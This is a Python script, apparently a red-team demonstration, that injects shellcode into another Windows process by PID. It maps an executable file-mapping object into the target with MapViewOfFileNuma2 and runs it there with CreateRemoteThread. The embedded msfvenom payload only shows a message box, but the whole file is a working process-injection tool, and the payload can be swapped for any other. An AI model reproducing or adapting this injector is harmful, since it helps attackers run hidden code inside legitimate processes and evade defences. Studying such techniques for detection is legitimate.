import sys
from ctypes import *
from ctypes.wintypes import *

# Windows Constants
PROCESS_CREATE_THREAD =     0x0002
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_OPERATION =      0x0008
PROCESS_VM_WRITE =          0x0020
PROCESS_VM_READ =           0x0010

INVALID_HANDLE_VALUE =      HANDLE(-1)
NUMA_NO_PREFERRED_NODE =    DWORD(-1)
PAGE_EXECUTE_READWRITE =    0x40
PAGE_EXECUTE_READ =         0x20
FILE_MAP_WRITE =            0x0002

# Windows types needed
class SECURITY_ATTRIBUTES(Structure):
    _fields_ = [ ('nLength', DWORD),
                 ('lpSecurityDescriptor', LPVOID),
                 ('bInheritHandle', BOOL) ]

LPDWORD = POINTER(DWORD)
LPSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = WINFUNCTYPE(DWORD, LPVOID)

# msfvenom -p windows/x64/messagebox -a x64 EXITFUNC=thread TEXT='Mapping Injection!' --format c
# Payload size: 325 bytes
# Final size of c file: 1390 bytes

shellcode = \
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51" \
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48" \
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48" \
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02" \
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e" \
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88" \
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48" \
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e" \
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41" \
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24" \
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0" \
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e" \
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41" \
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1" \
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d" \
    "\x85\x2d\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff" \
    "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48" \
    "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13" \
    "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x4d\x61\x70\x70\x69" \
    "\x6e\x67\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x21\x00\x4d" \
    "\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00"

if len(sys.argv) != 2:
    print "[*] Usage: %s <PID>" %(sys.argv[0])
    sys.exit(0)

kernel32 = windll.kernel32
KernelBase = windll.KernelBase
pid = sys.argv[1]

# https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
kernel32.OpenProcess.restype = HANDLE       # HANDLE OpenProcess(
kernel32.OpenProcess.argtypes = [DWORD,     #   DWORD dwDesiredAccess,
                                 c_bool,    #   BOOL  bInheritHandle,
                                 DWORD]     #   DWORD dwProcessId
                                            # );
# Get a handle to the target process
hProc = kernel32.OpenProcess((PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ), False, DWORD(int(pid)))
if not hProc:
    print "[-] Couldn't get handle to PID: %s" % pid
    sys.exit(0)

# https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
kernel32.CreateFileMappingA.restype = HANDLE        # HANDLE CreateFileMappingA(
kernel32.CreateFileMappingA.argtypes = [HANDLE,     #   HANDLE                hFile,
                                        LPVOID,     #   LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
                                        DWORD,      #   DWORD                 flProtect,
                                        DWORD,      #   DWORD                 dwMaximumSizeHigh,
                                        DWORD,      #   DWORD                 dwMaximumSizeLow,
                                        LPCSTR]     #   LPCSTR                lpName
                                                    # );
# Create a file mapping object so the shellcode doesn't have to be put on disk. This is achieved by using INVALID_HANDLE_VALUE as the first parameter.
hFileMap = kernel32.CreateFileMappingA(INVALID_HANDLE_VALUE, None, PAGE_EXECUTE_READWRITE, 0, len(shellcode), None)
if not hFileMap:
    print "[-] CreateFileMapping failed with error: %s" % kernel32.GetLastError()
    sys.exit(0)
print "[*] Created global file mapping object."

# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile
kernel32.MapViewOfFile.restype = LPVOID         # LPVOID MapViewOfFile(
kernel32.MapViewOfFile.argtypes = [HANDLE,      #   HANDLE hFileMappingObject,
                                   DWORD,       #   DWORD  dwDesiredAccess,
                                   DWORD,       #   DWORD  dwFileOffsetHigh,
                                   DWORD,       #   DWORD  dwFileOffsetLow,
                                   c_size_t]    #   SIZE_T dwNumberOfBytesToMap
                                                # );
# Create a local view with write permissions for copying shellcode into.
lpMapAddress = kernel32.MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, len(shellcode))
if not lpMapAddress:
    print "[-] MapViewOfFile failed with error: %s" % kernel32.GetLastError()
    sys.exit(0)

# https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019
cdll.msvcrt.memcpy.restype = c_void_p       # void *memcpy(
cdll.msvcrt.memcpy.argtypes = [c_void_p,    #    void *dest,
                               c_wchar_p,   #    const void *src,
                               c_int]       #    size_t count
                                            # );
# Place the shellcode into the mapping object.
cdll.msvcrt.memcpy(lpMapAddress, shellcode, len(shellcode))
print "[*] Written %s bytes to the global mapping object" % len(shellcode)

# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffilenuma2
KernelBase.MapViewOfFileNuma2.restype = LPVOID              # PVOID MapViewOfFileNuma2(
KernelBase.MapViewOfFileNuma2.argtypes = [HANDLE,           #   HANDLE  FileMappingHandle,
                                          HANDLE,           #   HANDLE  ProcessHandle,
                                          c_ulonglong,      #   ULONG64 Offset,
                                          c_void_p,         #   PVOID   BaseAddress,
                                          c_size_t,         #   SIZE_T  ViewSize,
                                          c_ulong,          #   ULONG   AllocationType,
                                          c_ulong,          #   ULONG   PageProtection,
                                          c_ulong]          #   ULONG   PreferredNode
                                                            # );
# Map in the memory we copied to the target process.
lpMapAddressRemote = KernelBase.MapViewOfFileNuma2(hFileMap, hProc, 0, None, 0, 0, PAGE_EXECUTE_READ, NUMA_NO_PREFERRED_NODE)
if not lpMapAddressRemote:
    print "[-] MapViewOfFile2 failed with error: %s" % kernel32.GetLastError()
    sys.exit(0)

print "[*] Injected global object mapping to the remote process with pid %s" % pid

# https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
kernel32.CreateRemoteThread.restype = HANDLE                        # HANDLE CreateRemoteThread(
kernel32.CreateRemoteThread.argtypes = [HANDLE,                     #   HANDLE                 hProcess,
                                        LPSECURITY_ATTRIBUTES,      #   LPSECURITY_ATTRIBUTES  lpThreadAttributes,
                                        c_size_t,                   #   SIZE_T                 dwStackSize,
                                        LPTHREAD_START_ROUTINE,     #   LPTHREAD_START_ROUTINE lpStartAddress,
                                        LPVOID,                     #   LPVOID                 lpParameter,
                                        DWORD,                      #   DWORD                  dwCreationFlags,
                                        LPDWORD]                    #   LPDWORD                lpThreadId
                                                                    # );
# Create a remote thread pointing to the starting address returned by MayViewOfFileNuma2.
hRemoteThread = kernel32.CreateRemoteThread(hProc, None, 0, LPTHREAD_START_ROUTINE(lpMapAddressRemote), None, 0, None)
if not hRemoteThread:
    print "[-] CreateRemoteThread failed with error: %s" % kernel32.GetLastError()
    sys.exit(0)

print "[+] Remote thread Started!"
kernel32.UnmapViewOfFile(lpMapAddress)
kernel32.CloseHandle(hFileMap)
